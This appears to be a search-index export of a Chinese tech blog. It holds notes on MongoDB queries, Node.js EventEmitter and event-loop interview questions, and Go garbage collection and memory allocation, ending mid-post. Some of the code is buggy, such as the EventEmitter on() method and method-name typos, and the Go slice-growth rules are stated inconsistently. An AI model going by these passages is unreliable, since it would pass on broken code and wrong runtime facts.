db.six.createIndex(&#123;loc: &quot;2d&quot;&#125;)loc_2d// 查询在[10, 10]~[12, 12]之间的数据Martin&gt; db.six.find(&#123;loc: &#123;$geoWithin: &#123;$box: [[10, 10], [12, 12]]&#125;&#125;&#125;)[ &#123; _id: ObjectId(&#x27;666d8d75f6e0bc9a3ecdf508&#x27;), loc: [ 11, 11 ] &#125; ] MongoDB查询计划MongoDB慢查询 查看是否开启慢查询1234Martin&gt; db.getProfilingStatus()&#123; was: 0, slowms: 100, sampleRate: 1, ok: 1 &#125;// was: 表示级别 0 - 不开启 1 - 记录慢查询（默认&gt;100ms） 2 - 记录所有命令// slowms: 表示慢查询时间设定值 Go操作MongoDB 创建连接 1234567891011121314151617181920212223242526272829303132333435// MongoDB连接配置client, err := mongo.NewClient(options.Client().ApplyURI(&quot;xxx&quot;))// 错误判断if err != nil &#123; fmt.Errorf(&quot;client establish failed, err: %v&quot;, err)&#125;// 超时控制ctx, cancel := context.WithTimeout(context.Background(), 10 * time.Second)defer cancel()// 创建连接if err = client.Connect(ctx); err == nil &#123; fmt.Println(&quot;connect to db success&quot;)&#125;// 连接databasedb := client.Database(&quot;Martin&quot;)// 获取集合名collectionNames, err := db.ListCollectionNames(ctx, bson.M&#123;&#125;)if err != nil &#123; fmt.Errorf(&quot;err: %v&quot;, err)&#125;// 输出集合名fmt.Println(&quot;collectionNames: &quot;, collectionNames)// 断开连接defer func() &#123; if err = client.Disconnect(ctx); err != nil &#123; panic(err) &#125;&#125; 创建文档 12// 写入当行文档","categories":[{"name":"MongoDB","slug":"MongoDB","permalink":"http://example.com/categories/MongoDB/"}],"tags":[{"name":"MongoDB","slug":"MongoDB","permalink":"http://example.com/tags/MongoDB/"}]},{"title":"NodeJS八股文","slug":"NodeJS八股文","date":"2024-05-12T14:34:56.000Z","updated":"2024-05-13T15:42:53.750Z","comments":true,"path":"21f5d73e.html","link":"","permalink":"http://example.com/21f5d73e.html","excerpt":"记录NodeJS八股文","text":"记录NodeJS八股文 说说对Node.js的理解？优缺点？应用场景？理解 开源与跨平台的JavaScript运行时环境 在浏览器外运行V8 JavaScript引擎（Google Chrome的内核）, 利用事件驱动、非阻塞和异步输入输出模型等技术提高性能; 优点 处理高并发场景性能更佳; 适合I&#x2F;O密集型应用; 缺点 单线程, 不适合CPU密集型应用; 只支持单核CPU, 不能充分利用CPU; 可靠性低, 一旦代码某个环节崩溃, 整个系统都崩溃; 说说Node中的EventEmitter？如何实现一个EventEmitter？Node采用了事件驱动机制, 而EventEmitter就是实现事件驱动的基础; 在EventEmitter的基础上, Node几乎所有的模块都继承了这个类, 这些模块拥有了自己的事件, 可以绑定&#x2F;触发监听器, 实现了异步操作; 12345678910111213// 实现一个自定义eventconst EventEmitter = require(&#x27;events&#x27;);class MyEmitter extends EventEmitter&#123;&#125;const myEmitter = new MyEmitter();function callback() &#123; console.log(&#x27;触发了event事件&#x27;);&#125;myEmitter.on(&#x27;event&#x27;, callback);myEmitter.emit(&#x27;event&#x27;);myEmitter.removeListener(&#x27;event&#x27;, callback); EventLoop在浏览器与NodeJS的区别结论 NodeJS版本 &gt;= 11之后就和浏览器保持一致; NodeJS版本 &lt;= 10, 浏览器和NodeJS环境下, 在microtask(微任务)任务队列的执行时机不同, 有不同的效果; 看题1234567891011121314151617function test() &#123; setTimeout(() =&gt; &#123; console.log(&#x27;children2&#x27;); Promise.resolve().then(() =&gt; &#123; console.log(&#x27;children2-1&#x27;); &#125;) &#125;, 0) setTimeout(() =&gt; &#123; console.log(&#x27;children3&#x27;); Promise.resolve.then(() =&gt; &#123; console.log(&#x27;children3-1&#x27;); &#125;) &#125;)&#125;test(); 答案12345// node &gt;= 11 &amp;&amp; 浏览器children2 children2-1 children3 children3-1// node &lt;= 10children2 children3 children2-1 children3-1 解析 我们就记住浏览器的EventLoop的机制就可以, 如果问到在NodeJS环境下的执行是什么, 我们可以来解析一下 在NodeJS 版本 &gt;= 11 以及浏览器下 执行test函数; 执行第一个setTimeout, 放入到宏任务中; 执行第二个setTimeout, 放入到宏任务中; 此刻微任务里面没有任务, 那么执行宏任务, 从队列的头部取出一个宏任务(第一个setTimeout); 打印children2, 此刻遇见Promise的then, 是微任务, 放入到微任务队列里面; 接下来我们发现微任务里面有任务了, 取微任务里面的任务, 打印出children2-1; 此刻微任务里面没有任务, 那么继续执行宏任务, 从任务队列的头部取出一个宏任务(第二个setTimeout); 打印children3, 此刻遇见Promise的then, 是微任务, 放入微任务队列里面; 接下来我们发现微任务里面有任务了, 取微任务里面的任务, 打印children3-1; 在NodeJS版本 &lt;= 10下 执行test函数; 执行第一个setTimeout, 放入到宏任务里面; 执行第二个setTimeout, 放入到宏任务里面; 此刻微任务里面没有任务, 那么执行宏任务, 从队列的头部取出一个宏任务(第一个setTimeout); 打印children2, 此刻遇见Promise的then, 是微任务, 放入到微任务队列里面; 注意注意！！！此刻将会继续从队列的头部取出一个宏任务(第二个setTimeout); 打印children3, 此刻遇见Promise的then, 是微任务, 放入到微任务队列里面; 此刻微任务队列里有2个任务, 依次取出执行children2-1 children3-1; 大白话它们的主要区别是执行微任务的时机不同, 假如此刻宏任务有2个任务AB, 此刻微任务队列什么都没有。如果是NodeJS版本 &lt;= 10下, 在执行A任务的时候产生了微任务W, A任务执行完毕, 那么会继续执行B, B执行完成之后再去执行微任务。而NodeJS版本 &gt;= 11 &amp;&amp; 浏览器执行A任务, 产生了微任务, A执行完之后要去执行微任务。 简述什么是EventEmitter？EventEmitter是Node.js中的一个核心模块, 主要用于处理事件相关的操作。它是事件驱动编程模式的一个实现, 提供了一种机制, 允许对象（也被事件发射器）发布（emit）事件, 而其他对象（也被称为监听器）可以订阅这些事件并定义当这些事件发生时应该执行的回调函数; EventEmitter的主要功能包括事件的注册和监听、事件触发与传递参数, 以及事件的移除。通过调用EventEmitter的on或addListener方法, 可以将事件监听器绑定到特定的事件上。当使用EventEmitter的emit方法触发特定的事件时, 所有注册到该事件的监听器将会按照注册的顺序被调用, 并且可以传递参数给事件监听器。此外, 通过调用removeListener方法, 可以在不需要时移除特定事件的监听器; EventEmitter是一种发布-订阅模式的实现, 也是一种观察者模式的实现。它充当了事件调度中心的角色, 是Node.js中实现异步操作的关键组件之一。 如何实现一个EventEmitter？什么是EventEmitter？在Node.js中, EventEmitter是事件驱动的基础, 几乎所有模块都继承自它。它实现了观察者模式, 其中被观察者维护一组观察者, 并在更新时通知观察者; EventEmitter允许对象绑定和触发事件监听器, 实现异步操作。在Node.js中, 许多对象都会分发事件, 例如fs.readStream对象会在文件被打开时触发一个事件; 使用EventEmitterNode.js的events模块提供了一个EventEmitter类, 可以通过继承它创建自定义事件对象。 基本使用方法如下： 12345678910111213const EventEmitter = require(&#x27;events&#x27;);class MyEmitter extends EventEmitter&#123;&#125;;const myEmitter = new MyEmitter();function callback() &#123; console.log(&#x27;触发了event事件&#x27;);&#125;myEmitter.on(&#x27;event&#x27;, callback);myEmitter.emit(&#x27;event&#x27;);myEmitter.removeListener(&#x27;event&#x27;, callback); EventEmitter的常用方法有： on(eventName, listener)：添加类型为eventName的事件监听器; once(eventName, listener)：添加类型为eventName的事件监听器, 但只能执行一次, 执行后将被删除; prependListener(eventName, listener)：添加类型为eventName的事件监听器到事件数组头部; emit(eventName, ...args)：触发类型为eventName的事件监听器; removeListener(eventName, listener)：移除类型为eventName的事件监听器; 实现自定义EventEmitter我们可以简单实现一个EventEmitter类, 了解其基本原理。在实现过程中, 需要维护一个包含所有事件的对象events。 12345678910111213141516171819202122232425262728class EventEmitter &#123; constructor() &#123; this.events = &#123;&#125;; &#125; on(type, handler) &#123; if (!this.events[type]) &#123; this.events = []; &#125; this.events[type].push(handler); &#125; emit(type, ...args) &#123; if (!this.events[type]) &#123; return; &#125; this.events[type].forEach((handler) =&gt; &#123; handler.apply(this, args); &#125;) &#125; removeListener(type, handler) &#123; if (!this.events[type]) &#123; return; &#125; this.events[type] = this.events[type].filter((item) =&gt; item != handler); &#125;&#125; 测试自定义EventEmitter123456789101112131415161718192021const bus = new EventEmitter();bus.on(&#x27;event&#x27;, () =&gt; &#123; console.log(&#x27;Event 1&#x27;)&#125;)function event2() &#123; console.log(&#x27;Event 2&#x27;);&#125;bus.on(&#x27;event&#x27;, event2);bus.emit(&#x27;event&#x27;);// Output:// Event 1// Event 2bus.removeLister(&#x27;event&#x27;, event2);bus.emit(&#x27;event&#x27;);// Output:// Event 1 总结EventEmitter是Node.js中非常重要的一个模块, 它实现了事件驱动的基本模式, 让Node.js具备了处理异步操作的能力。","categories":[{"name":"NodeJS","slug":"NodeJS","permalink":"http://example.com/categories/NodeJS/"}],"tags":[{"name":"NodeJS","slug":"NodeJS","permalink":"http://example.com/tags/NodeJS/"}]},{"title":"Golang垃圾回收","slug":"Golang垃圾回收","date":"2024-04-18T04:25:25.000Z","updated":"2024-05-16T11:18:50.316Z","comments":true,"path":"d19ea524.html","link":"","permalink":"http://example.com/d19ea524.html","excerpt":"现代高级编程语言管理内存的方式分自动和手动两种; 手动管理内存的典型代表是C&#x2F;C++, 编写代码过程中需要主动申请或者释放内存; 而PHP、Java和Go等语言使用自动的内存管理系统, 由内存分配器和垃圾收集器来代为分配和回收内存, 其中垃圾收集器就是GC 从Go v1.12版本开始, Go使用了非分代的、并发的、基于三色标记清除的垃圾回收器; Go是一种静态类型的编译型语言; 因此, Go不需要VM, Go应用程序二进制文件中嵌入了一个小型运行时(Go runtime), 可以处理垃圾收集(GC)、调度和并发之类的语言功能","text":"现代高级编程语言管理内存的方式分自动和手动两种; 手动管理内存的典型代表是C&#x2F;C++, 编写代码过程中需要主动申请或者释放内存; 而PHP、Java和Go等语言使用自动的内存管理系统, 由内存分配器和垃圾收集器来代为分配和回收内存, 其中垃圾收集器就是GC 从Go v1.12版本开始, Go使用了非分代的、并发的、基于三色标记清除的垃圾回收器; Go是一种静态类型的编译型语言; 因此, Go不需要VM, Go应用程序二进制文件中嵌入了一个小型运行时(Go runtime), 可以处理垃圾收集(GC)、调度和并发之类的语言功能 Golang内存管理Golang运行调度三个基本概念: G、M、P; G: Goroutine执行的上下文环境; M: 操作系统进程; P: Processer; 调度器的关键, 调度器, 也可以认为约等于CPU; Go内存管理 TCMallocGo将内存划分和分组为页(Page), 这和Java的内存结构完全不同, 没有分代内存, 这样的原因是Go的内存分配器采用了TCMalloc的设计思想: Page与TCMalloc中的Page相同, x64下1个Page的大小是8KB; 上图的最下方, 1个浅蓝色长方形代表1个Page; Span与TCMalloc中的Span相同, Span是内存管理的基本单位; 代码中为mspan, 一组连续的Page组成1个Span, 所以上图一组连续的浅蓝色长方形代表的是一组Page组成的1个Span, 另外1个淡紫色长方形为1个Span; mcachemcache是提供给P(逻辑处理器)的高速缓存, 用于存储小对象(对象大小&lt;&#x3D;32Kb); 尽管这类似于线程堆栈, 但它是堆的一部分, 用于动态数据; 所有类大小的mcache包含scan和noscan类型的mspan。Goroutine可以从mcache没有任何锁的情况下获取内存, 因为一次P只能有一个锁G。因此, 这更有效。mcache从mcentral需要时请求新的span; mcentralmcentral与TCMalloc中的CentralCache类似, 是所有线程共享的缓存, 需要加锁访问, 它按Span class对Span分类, 串联成链表, 当mcache的某个级别的内存被分配光时, 它会像mcentral申请1个当前级别的Span。每个mcentral包含两个mspanList: empty: 双向span链表, 包括没有空闲对象的span或缓存mcache中的span。当此处的span被释放时, 它将被移至non-empty span链表; non-empty: 有空闲对象的span双向链表。当从mcentral请求新的span, mcentral将从该链表中获取span并将其移入empty span链表; mheapmheap与TCMalloc中的PageHeap类似, 它是堆内存的抽象, 也是垃圾回收的重点区域, 把从OS申请出的内存页组织成Span, 并保存起来。当mcentral的Span不够用时会向mheap申请, mheap的Span不够用时会向OS申请, 向OS的内存申请是按页来的, 然后把申请来的内存页生成Span组织起来, 同样也是需要加锁访问的; 栈这是栈存储区, 每个Goroutine(G)有一个栈。在这里存储了静态数据, 包括函数栈帧, 静态结构, 原生类型值和指向动态结构的指针。这与分配给每个P的mcache不是一回事; 内存分配Go中的内存分类并不像TCMalloc分成小、中、大对象, 但是它的小对象里又细分了一个Tiny对象, Tiny对象指大小在1Byte到16Byte之间并且不包含指针的对象。小对象和大对象只用大小划定, 无其他区分; 核心思想: 把内存分为多级管理, 降低锁的粒度(只是去mcentral和mheap会申请锁), 以及多种对象大小类型, 减少分配产生的内存碎片; 微小对象(Tiny)（size &lt; 16B）使用mcache的微小分配器分配小于16个字节的对象, 并且在单个16字节块上可完成多个微小分配; 小对象（size 16B ~ 32KB）大小在16个字节和32k字节之间的对象被分配在G运行所在的P的mcache对应的mspan size class上; 大对象（size &gt; 32KB）大于32 KB的对象直接分配在mheap的相应大小类上(span class); 如果mheap为空或没有足够大的页面满足分配请求, 则它将从操作系统中分配一组新的页(至少1MB); 如果对应的大下规格在mcache中没有可用的块, 则向mcentral申请; 如果mcentral中没有可用的块, 则向mheap中申请, 并根据BestFit算法找到最合适的mspan。如果申请到的mspan超出申请大小, 将会根据需求进行切分, 以返回用户所需的页数。剩余的页构成一个新的mspan放回mheap的空闲列表; 如果mheap中没有可用的span, 则向操作系统申请一系列新的页(最小1MB)。Go会在操作系统分配超大的页(称作arena)。分配一大批页会减少和操作系统通信的成本; 内存回收go内存会分成堆区(Heap)和栈区(Stack)两个部分, 程序在运行期间可用主动从堆区申请内存空间, 这些内存由内存分配器分配并由垃圾收集器回收。栈区内存由编译器自动进行分配和释放, 栈区中存储的参数以及局部变量, 它们会随着函数的创建而创建, 函数的返回而销毁。如果只申请和分配内存, 内存终将枯竭, Go使用垃圾回收收集不再使用的span, 把span释放交给mheap, mheap对span进行span的合并, 把合并后的span加入到scav树中, 等待再分配内存时, 由mheap进行内存再分配。因此, Go堆是Go垃圾收集器管理主要区域; 标记清除算法当成功区分出Go垃圾收集器管理区域的存活对象和死亡对象后, Go垃圾收集器接下来的任务就是执行GC, 释放无用对象占用的内存空间, 以便有足够的可用内存空间为新对象分配内存。 当堆空间被耗尽时, 就会STW(stop the world), 其执行过程可以分成标记和清除两个阶段。Go垃圾收集器从根节点开始遍历, 执行可达性分析算法, 递归标记所有被引用的对象为存活状态; 标记阶段结束后, 垃圾收集器会依次遍历堆中的对象并清除其中的未被标记为存活的对象; 由于用户程序在垃圾收集的过程中也不能执行(STW)。在可达性分析算法, Go的GC Roots一般为全局变量和G Stack中的引用指针, 和整堆的对象相比只是极少数, 因此它带来的停顿是非常短暂且相对固定的, 不随堆容量增长。在从GC Roots往下遍历对象的过程, 堆越大, 存储对象越多, 递归遍历越复杂, 要标记更多对象而产生的停顿时间自然就更长。因此我们需要用到更复杂的机制来解决STW的问题; 三色可达性分析为了解决标记清除算法带来的STW问题, Go和Java都会实现三色可达性分析标记算法的变种以缩短STW的时间。三色可达性分析标记算法按”是否被访问过”将程序中的对象分成白色、黑色和灰色: 白色对象 - 对象尚未被垃圾收集器访问过, 在可达性分析刚开始的阶段, 所有的对象都是白色的, 若在分析结束阶段, 仍然是白色的对象, 即代表不可达; 黑色对象 - 表示对象已经被垃圾收集器访问过, 且这个对象的所有引用都已经被扫描过, 黑色的对象代表已经被扫描过而且是安全存活的, 如果有其他对象指向黑色对象无需再扫描一遍, 黑色对象不可能直接(不经过灰色对象)指向某个白色对象; 灰色对象 - 表示对象已经被垃圾收集器访问过, 但是这个对象上至少存在一个引用还没有被扫描过, 因此存在指向白色对象的外部指针, 垃圾收集器会扫描这些对象的子对象; 三色可达性分析算法大致流程是(初始状态所有对象都是白色): 从GC Roots开始枚举, 它们所有的直接引用变成灰色(移入灰色集合), GC Roots变为黑色; 从灰色集合中取出一个灰色对象进行分析: 将这个对象所有的直接引用变为灰色, 放入灰色集合中; 将这个对象变为黑色; 重复步骤2, 一直重复直到灰色集合为空; 分析完成, 仍然是白色的对象就是GC Roots不可达的对象, 可以作为垃圾被清理; 具体例子如下图所示, 经过三色可达性分析, 最后白色H为不可达的对象, 是需要垃圾回收的对象; 三色可达性分析 三色标记清除算法本身是不可以并发或者增量执行的, 它需要STW, 而如果并发执行, 用户程序可能在标记执行的过程中修改对象的指针; 三色标记清除算法(增量执行) 这种情况一般会有2种: 一种是把原来应该垃圾回收的死亡对象错误的标记为存活。虽然这不好，但是不会导致严重后果, 只不过产生了一点逃过本次回收的浮动垃圾而已, 下次清理即可, 比如上图所示的三色标记过程种, 用户取消了从B对象到E对象的引用, 但是因为B到E已经被标记完成不会继续执行步骤2, 所以E对象最终会被错误的标记成黑色, 不会被回收, 这个D就是浮动垃圾, 会在下次垃圾收集中清理; 一种是把原本存活的对象错误的标记为死亡, 导致”对象消失”, 这在内存管理种是非常严重的错误。比如上图所示的三色标记过程种, 用户程序建立了从B对象到H对象的引用(例如B.next&#x3D;H), 接着执行D.next&#x3D;nil, 但是因为B到H中不存在灰色对象, 因为在这之间不会继续执行三色并发标记中的步骤2, D到H之间的链接被断开, 所以H对象最终会被标记成白色, 会被垃圾收集器错误的回收。我们将这种错误称为悬挂指针, 即指针没有指向特定类型的合法对象, 影响了内存的安全性; 屏障技术为了解决上述的”对象消失”的现象, Wilson于1994年在理论上证明了, 当且仅当以下两个条件同时满足时, 会产生”对象消失”的问题, 即原本应该是黑色的对象被误标为白色: 赋值器插入了一条或多条从黑色对象到白色对象的新引用; 赋值器删除了全部从灰色对象到该白色对象的直接或间接引用; 因此为了要解决并发扫描时的对象消失问题, 保证垃圾收集算法的正确性, 只需破坏这两个条件的任意一个即可, 屏障技术就是在并发或增量标记过程中保证三色不变性的重要技术; 内存屏障技术是一种屏障指令, 它可以让CPU或者编译器在执行内存相关操作时遵循特定的约束, 目前多数的现代处理器都会乱序执行指令以最大化性能, 但是该技术能够保证内存操作的顺序性, 在内存屏障前执行的操作一定会先于内存屏障后执行的操作。垃圾收集中的屏障技术更像是一个钩子方法, 它是在用户程序读取对象、创建新对象以及更新对象指针时执行的一段代码, 根据操作类型不同, 我们可以将它们分成读屏障(Read barrier)和写屏障(Write barrier)两种, 因此读屏障需要在读操作中加入代码片段, 对用户程序的性能影响很大, 所以编程语言往往都会采用写屏障保证三色不变性; 插入写屏障Dijksrea在1978年提出了插入写屏障, 也被叫做增量更新, 通过如下所示的写屏障, 破坏上述第一个条件(赋值器插入了一条或多条从黑色对象到白色对象的新引用): 12345678func DijkstraWritePointer(slot *unsafe.Pointer, ptr unsafe.Pointer) &#123; shade(ptr) //先将新下游对象 ptr 标记为灰色 *slot = ptr&#125;//说明：添加下游对象(当前下游对象slot, 新下游对象ptr) &#123; //step 1 标记灰色(新下游对象ptr) //step 2 当前下游对象slot = 新下游对象ptr &#125;//场景：A.添加下游对象(nil, B) //A 之前没有下游， 新添加一个下游对象B， B被标记为灰色A.添加下游对象(C, B) //A 将下游对象C 更换为B， B被标记为灰色 上述伪代码非常好理解, 当黑色对象(slot)插入新的指向白色对象(ptr)的引用关系时, 就尝试使用shade函数将这个新插入的引用(ptr)标记为灰色; 插入写屏障 假设我们上图的例子并发可达性分析中使用了插入写屏障: GC将根对象Root2指向的B对象标记成黑色并将B对象指向的对象D标记成灰色; 用户程序修改指针, B.next&#x3D;H这时触发写屏障将H对象标记成灰色; 用户程序修改D.next&#x3D;nil; GC依次遍历程序中的H和D将它们分别标记成黑色; 由于栈上的对象在垃圾回收中被认为是根对象, 并没有写屏障, 那么导致黑色的栈对象可能指向白色的堆对象, 例如上图1中Root2指向H, 且删除了由D指向H的引用, 由于没有写屏障, 那么H将会被删除。为了保障内存安全, Dijkstra必须为栈上的对象增加写屏障或者在标记阶段完成重新对栈上的对象进行扫描, 这两种方法各有各的缺点, 前者会大幅度增加写入指针的额外开销, 后者重新扫描栈对象时需要暂停对象, 垃圾收集算法的设计者需要在这两者之间做出权衡; 删除写屏障Yuasa在1990年提出了删除写屏障, 因为一旦该写屏障开始工作, 它会保证开启写屏障时堆上所有对象的可达, 起始时STW扫描所有的goroutine栈, 保证所有堆上在用的对象都处于灰色保护下, 所以也被称为快照垃圾收集(Snapshot GC), 这是破坏了”对象消失”的第二个条件(赋值器在删除了全部从灰色对象到该白色对象的直接或间接引用); 12345678910// 黑色赋值器 Yuasa 屏障func YuasaWritePointer(slot *unsafe.Pointer, ptr unsafe.Pointer) &#123; shade(*slot) // 先将*slot标记为灰色 *slot = ptr &#125;//说明：添加下游对象(当前下游对象slot， 新下游对象ptr) &#123; //step 1 if (当前下游对象slot是灰色 || 当前下游对象slot是白色) &#123; 标记灰色(当前下游对象slot) //slot为被删除对象， 标记为灰色 &#125; //step 2 当前下游对象slot = 新下游对象ptr&#125;//场景A.添加下游对象(B, nil) //A对象，删除B对象的引用。B被A删除，被标记为灰(如果B之前为白)A.添加下游对象(B, C) //A对象，更换下游B变成C。B被A删除，被标记为灰(如果B之前为白) 上述代码会在老对象的引用被删除时, 将白色的老对象涂成灰色, 这样删除写屏障就可以保证三色不变性, 老对象引用的下游对象一定可以被灰色对象引用; 但是这样也会导致一个问题, 由于会将有存活可能的对象都标记成灰色, 因此最后可能会导致应该回收的对象未被回收, 这个对象只有在下一个循环才会被回收, 比如下图的D对象 此处有图片 由于原始快照的原因, 起始也是执行STW, 删除写屏障不适用于栈特别大的场景, 栈越大, STW扫描时间越长; 混合写屏障在Go语言v1.7版本之前, 运行时会使用Dijkstra插入写屏障保证三色不变性, 但是运行时并没有在所有垃圾收集根对象上开启插入写屏障。因为应用程序可能包含成百上千的Goroutine, 而垃圾收集的根对象一般包括全局变量和栈对象, 如果运行时需要在几百个Goroutine的栈上都开启写屏障, 会带来巨大的额外开销, 所以Go团队在v1.8结合上述2种写屏障构成了混合写屏障, 实现上选择了在标记阶段完成时暂停程序、将所有栈对象标记成灰色并重新扫描; Go语言在v1.8组合Dijkstra插入写屏障和Yuasa删除写屏障构成了如下所示的混合写屏障, 该写屏障会将覆盖的对象标记成灰色并在当前栈没有扫描时将新对象也标记成灰色; 1234567func writePointer(slot, ptr) &#123; shade(*slot) if current stack is grey &#123; shade(ptr) &#125; *slot = ptr&#125; 为了移除栈的重新扫描过程, 除了引入混合写屏障之外, 在垃圾收集的标记阶段, 我们还需要将创建的所有新对象都标记成黑色, 防止新分配的栈内存和堆内存中的对象被错误地回收, 以为栈内存在标记阶段最终都会变为黑色, 所以不再需要重新扫描栈空间。总结来说主要有这几点: GC开始将栈上地对象全部扫描并标记为黑色; GC期间, 任何在栈上创建地新对象, 均为黑色; 被删除的堆对象标记成灰色; 被添加的堆对象标记成灰色; 模拟面试STW（Stop-The-World） STW问题: 在垃圾回收期间, 所有的程序操作都被暂停, 直到垃圾回收过程完成。这对高并发应用特别有害, 因为它会导致显著的响应时间和系统吞吐量下降。 STW的具体影响有哪些？例如在响应时间和吞吐量方面 响应时间: STW会导致所有Goroutine暂停, 用户请求无法得到及时响应, 导致应用程序的响应时间增加。 吞吐量: 在STW期间, 整个系统的处理能力会下降, 因为没有任何工作在进行。这会降低系统的吞吐量, 使得单位时间内处理的请求数量减少。 屏障技术 屏障技术: 通过在程序的某些操作上设置”屏障”, 来减少STW的时间。屏障主要有三种类型: 写屏障, 读屏障和删除屏障。 具体屏障类型 写屏障: 写屏障在对象引用被写入时触发, 通过记录这些修改, 确保垃圾回收器能够跟踪到所有引用的变化。 插入写屏障: 在对象引用被插入时触发。当一个新引用被写入某个对象字段时, 写屏障会记录这个操作。它确保在GC过程中, 这个新的引用被正确地标记和处理; 删除写屏障: 在对象引用被删除时触发, 当一个引用从某个对象字段中被删除时, 写屏障会记录下这个操作, 确保GC能够正确处理引用的删除; 混合写屏障: 结合了插入和删除写屏障的特性, 确保在对象引用被修改时正确记录, 结合插入和删除写屏障的功能, 确保任何引用的变化都能被追踪到。 具体实现: 插入写屏障: 在对象赋值操作前, 插入写屏障逻辑, 记录新引用的对象; 删除写屏障: 在对象字段被清空或重新赋值前, 记录旧引用的对象; 混合写屏障: 综合上述两种操作, 确保所有引用变化都被记录; 三色标记清除算法的每一步是什么, 以及每一种颜色在个步中的作用？步骤: 初始化: 所有对象开始都是白色; 标记根对象: 从根对象（Roots）开始扫描, 将根对象标记为灰色, 并将其放入待处理队列; 处理灰色对象: 取出一个灰色对象, 将它标记为黑色; 扫描该对象引用的所有子对象, 将未标记的子对象标记为灰色, 并放入待处理队列; 重复: 重复上一步, 直到待处理队列为空; 清除白色对象: 所有未被标记为黑色对象（即白色对象）被认为是垃圾并清除; 颜色含义: 黑色: 已访问并处理完毕的对象, 不再需要扫描; 灰色: 已访问但其引用的对象还未全部处理的对象, 需要进一步扫描; 白色: 未访问的对象, 被认为是垃圾; Slice 在Go语言中, Slice是一个动态数组的封装, 它由三个部分组成: 指向底层数组的指针、长度（len）和容量（cap）。 12345type slice struct &#123; ptr *ElementType // 指向底层数组的指针 len int // 当前slice中元素的个数 cap int // slice的容量, 即底层数组中的元素个数&#125; slice扩容策略 每次扩容会使得新的容量变为原来的2倍(cap*2); 如果当前slice的容量小于1024, 则每次扩容时新容量会变为原来的1.25倍(cap*1.25)。这种情况下, 对于小型slice, 扩容增长速度会慢一些, 以节省空间; 如果slice的长度小于1024, 则新的容量会按照上述规则进行计算。否则, 新的容量会增加与当前slice长度的一半; 当slice进行扩容时, Go语言会进行以下操作: 分配一个新的底层数组, 并将原有的元素拷贝到新数组中; 将slice的指针指向新的底层数组, 同时更新slice的长度和容量;","categories":[{"name":"Golang","slug":"Golang","permalink":"http://example.com/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://example.com/tags/Golang/"}]},{"title":"Golang内存管理","slug":"Golang内存管理","date":"2024-03-12T14:49:09.000Z","updated":"2024-04-16T15:19:53.850Z","comments":true,"path":"e2894e3d.html","link":"","permalink":"http://example.com/e2894e3d.html","excerpt":"Golang内存分配机制Go语言内置运行时(就是runtime), 抛弃了传统的内存分配方式, 改为自主管理。这样可以自主实现更好的内存使用模式, 比如内存池、预分配等等。这样, 不会每次内存分配都需要系统调用;","text":"Golang内存分配机制Go语言内置运行时(就是runtime), 抛弃了传统的内存分配方式, 改为自主管理。这样可以自主实现更好的内存使用模式, 比如内存池、预分配等等。这样, 不会每次内存分配都需要系统调用; 设计思想 内存分配算法采用Google的TCMalloc算法, 每个线程都会自行维护一个独立的内存池, 进行内存分配时优先从该内存池中分配, 当内存池不足时才会向加锁的全局内存池申请, 减少系统调用并且避免不同线程对全局内存池的锁竞争; 把内存切分的非常细小, 分为多级管理, 以降低锁的粒度; 回收对象时, 并没有将其真正释放, 只是放回预先分配的大块内存中, 以便复用。只有内存闲置过多的时候, 才会尝试归还部分内存给操作系统, 降低整体开销; 分配组件 Go的内存管理组件主要有: mspan、mcache、mcentral和mheap; 内存分配 内存管理单元: mspanmspan是内存管理的基本单元, 该结构体中包含next和prev两个字段, 它们分别指向前一个和后一个mspan, 每个mspan都管理npages个大小为8kb的页, 一个span是由多个page组成, 这里的页不是操作系统中的内存页, 它们是操作系统内存页的整数倍; page是内存存储的基本单元, “对象”放到page中 12345678910type mspan struct &#123; next *mspan // 前指针 prev *mspan // 后指针 startAddr uintptr // 管理页的起始地址, 指向page npages uintptr // 页数 spanclass spanClass // 规格 ...&#125;type spanClass uint8 Go有68种不同大小的spanClass, 用于小对象分配 12const _NumSizeClasses = 68var class_to_size = [_NumSizeClasses]uint16&#123;0, 8, 16, 32, 48, 64, 80, 96, 112, 128, 144, 160, 176, 192, 208, 224, 240, 256, 288, 320, 352, 384, 416, 448, 480, 512, 576, 640, 704, 768, 896, 1024, 1152, 1280, 1408, 1536,1792, 2048, 2304, 2688, 3072, 3200, 3456, 4096, 4864, 5376, 6144, 6528, 6784, 6912, 8192, 9472, 9728, 10240, 10880, 12288, 13568, 14336, 16384, 18432, 19072, 20480, 21760, 24576, 27264, 28672, 32768&#125; 如果按照序号为1的spanClass(对象规格为8B)分配, 每个span占用堆的字节数: 8k, mspan可以保存1024个对象;如果按照序号为2的spanClass(对象规格为16B)分配, 每个span占用堆的字节数: 8k, mspan可以保存512个对象;…如果按照序号为67的spanClass(对象规格为32K)分配, 每个span占用堆的字节数: 32k, mspan可以保存1个对象; class bytes&#x2F;obj bytes&#x2F;span objects tail waste max waste 1 8 8192 1024 0 87.50% 2 16 8192 512 0 43.75% 3 24 8192 341 0 29.24% 4 32 8192 256 0 46.88% 5 48 8192 170 32 31.52% 6 64 8192 128 0 23.44% 7 80 8192 102 32 19.07% … … … … … … 67 32768 8192 1 0 12.50% 字段含义: class: class ID, 每个span结构种都有一个class ID, 表示该span可处理的对象类型; bytes&#x2F;obj: 该class代表对象的字节数; bytes&#x2F;span: 每个span占用堆的字节数, 也即页数*页大小; objects: 每个span可分配的对象个数, 也即(bytes&#x2F;spans) &#x2F; (bytes&#x2F;obj); waste bytes: 每个span产生的内存碎片, 也即(bytes&#x2F;spans) % (bytes&#x2F;obj) 大于32k的对象出现时, 会直接从heap分配一个特殊的span, 这个特殊的span的类型(class)是0, 只包含了一个大对象; 线程缓存: mcachemcache管理线程在本地缓存的mspan, 每个goroutine绑定的P都有一个mcache字段 123456type mcache struct &#123; alloc [numSpanClasses]*mspan&#125;_NumSizeClasses = 68numSpanClasses = _NumSizeClasses &lt;&lt; 1 mcache和Span Classes作为索引管理多个用于分配的mspan, 它包含所有规格的mspan。它是_NumSizeClasses的2倍, 也就是68*2=136, 其中*2是将spanClass分成了有指针和没有指针两种, 方便于垃圾回收。对于每种规格, 有2个mspan, 一个不包含指针, 另一个则包含指针。对于无指针对象的mspan在进行垃圾回收时无需进一步扫描它是否引用了其他活跃的对象。 mcache在初始化的时候是没有任何mspan资源的, 在使用过程种会动态地从mcentral申请, 之后会缓存下来。当对象小于等于32KB时, 使用mcache的相应规格的mspan进行分配。 中心缓存: mcentralmcentral管理全局的mspan供所有线程使用, 全局mheap变量包含central字段, 每个mcentral结构都维护在mheap结构内; 123456type mcentral 